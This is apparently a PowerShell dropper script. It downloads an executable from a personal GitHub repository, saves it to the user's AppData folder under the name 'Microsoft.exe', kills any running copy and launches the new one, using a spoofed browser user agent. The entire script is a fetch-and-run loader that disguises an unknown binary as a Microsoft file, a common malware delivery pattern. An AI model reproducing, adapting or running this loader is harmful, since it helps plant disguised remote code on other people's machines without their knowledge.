$exePath = "$env:APPDATA\Microsoft.exe"
$exeUrl = "https://github.com/qoqoxxxx-stack/aa/raw/refs/heads/main/Microsoft.exe" # Make sure your URL is here

# --- FIX: Kill the process if it is already running ---
Stop-Process -Name "Microsoft" -Force -ErrorAction SilentlyContinue

# --- FIX: Wait a second for the file to unlock ---
Start-Sleep -Seconds 1

try {
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UserAgent "Mozilla/5.0"
    Start-Process $exePath
} catch {
    Write-Host "Could not download file. Make sure the URL is correct." -ForegroundColor Red
}
